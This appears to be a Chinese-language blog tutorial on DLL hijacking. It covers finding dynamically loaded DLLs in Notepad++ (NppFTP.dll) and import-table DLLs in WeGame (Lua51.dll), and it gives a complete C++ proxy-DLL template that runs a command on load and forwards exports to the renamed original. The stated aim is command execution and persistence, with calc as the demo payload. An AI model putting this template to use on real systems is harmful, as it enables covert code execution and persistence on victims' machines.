这篇分享  对存在的dll文件进行劫持：

分为两种：

对 存在的dll文件中通过loadlibrary动态加载的dll 进行劫持

对非Know Dlls导入表中的dll进行劫持




对存在的dll文件中动态加载的dll劫持

—



为什么选择通过loadlibrary动态加载的dll进行劫持

因为如果某个dll是通过loadlibrary动态加载的，那么它的调用可以不用任何导出函数就可解析成功，因此这种dll是可以尝试进行劫持的

其中我觉得最重要的是要利用dll转发，保留源程序功能


利用工具：

process monitor是一种进程监视工具，可以监视系统中所有进程文件的操作

cff explorer，通过cff explorer可以查看到dll文件可供调用的导出函数



1，打开process monitor，设置过滤条件 result为success，之后再打开notepad++

此处result 为success的原因是，过滤出其中的存在的dll文件并成功加载的

2，随便选择一个是通过loadlibrary动态加载的已存在的dll文件，这里选择NppFTP.dll


此处两个loadlibrary实现的功能是一样的都是为了动态加载dll，只不过里面的路径加载方式不同

3，将NppFTP.dll从 cff explorer打开，寻找其中的导出函数


从上图中可以看到该dll中存在6个导出函数，此处随便选择一个即可，setInfo


dll转发（转发模板是通用的，只需要更改文件名和导出函数）

4，打开vs，编写cpp 生成dll文件

创建的步骤与之前一样

代码如下：

// dllmain.cpp : 定义 DLL 应用程序的入口点。#include "pch.h"#include <stdlib.h>
extern "C" __declspec(dllexport) void setInfo();//声明函数名不可进行更改，否则在进行构建dll时可能会出现错误BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                     ){    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:        system("calc");    case DLL_THREAD_ATTACH:    case DLL_THREAD_DETACH:    case DLL_PROCESS_DETACH:        break;    }    return TRUE;}void setInfo()//运行完上面的代码之后将会运行该导出函数{    MessageBox(NULL, L"hello", L"SD", NULL);    HINSTANCE hDll = LoadLibrary(L"NppFTP_org.dll");//转发到的原始dll文件    if (hDll)    {        typedef DWORD(WINAPI* EXPFUNC)();        EXPFUNC expFunc = NULL;        expFunc = (EXPFUNC)GetProcAddress(hDll, "setInfo");        if (expFunc)        {            expFunc();        }        FreeLibrary(hDll);    }    return;}

此段代码生成dll后，将其命名为NppFTP.dll，而原始的dll重命名为NppFTP_org.dll

执行流程：

当我们运行应用程序时，它会先调用nppftp.dll，由于里面有我们事先写入的命令执行的代码，执行完毕后，会通过我们写的转发函数setinfo函数转发到Nppftp_org.dll中执行，从而保持源程序的正常执行，不会因找不到dll文件而出现中断



5，打开软件运行，可以看到计算机弹出，源程序正常执行




对非Know Dlls导入表中的dll进行劫持



导入表的功能：

记录了一个exe或者一个dll所用到的其他模块的导出函数，包括用了哪些模块(用了哪些dll),用了dll的哪些函数等


windows装载器在进行PE装载时，会将导入表中登记的所有dll一并装入，然后通过导入表寻找到dll中定义的函数，执行对应的功能

此处就是通过劫持导入表中的dll，使其执行我们写入的恶意命令，之后再通过dll中转，保持源程序的正常运行，实现命令执行，权限维持


实战 WeGame

1，通过CFF_Explorer分析wegame的导入表

可以看到有多个导入表，此处要选择的是非Knowdlls中dll进行劫持

为什么不对Knowdlls中的dll行劫持

因为Knowdlls中的（KERNEL32.DLL、USER32.DLL，等），这些处于KonwDlls中的dll劫持难度比较大，受系统保护，想要修改需要很大的权限，所以劫持时避开这些dll

KnowDLLs位于：

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs

通过对照发现Lua51.dll不存在于KnowDLLs中，并且在程序的安装目录可以找到：

该如何劫持这种不是通过LoadLibrary动态加载的DLL？？？

由于在调用栈中并没有看到 LoadLibrary，这是因为该DLL并不是被进程动态加载的，而是通过应用程序的导入表直接或者间接导入了这个DLL。在这种利用场景下要想利用成功，需要伪造伪造DLL的导出表与被伪造DLL的导出表完全一致，否则DLL可能无法被进程成功加载（会弹出错误提示消息框）。

于是可以通过AheadLib 工具分析原始dll，以生成此类DLL的源文件，对dll的源文件进行修改并重新生成，来达到dll劫持的效果


此种方式实现的dll劫持，又大体分为两个不同的实现方式

‍关于直接转发函数和即时调用函数的区别

我个人理解的是

直接转发函数是在注入的dll文件中，通过其中的定义的导出函数，让它去寻找并加载原始dll的执行，这样就可以使命令成功执行，也可以通过中转保证源程序的正常执行

即时调用函数是在入口函数执行完后，通过return返回到load函数中，之后再由load函数完成原始dll的加载

区别的话就是一个是直接通过dll加载，一个通过函数的即时转发
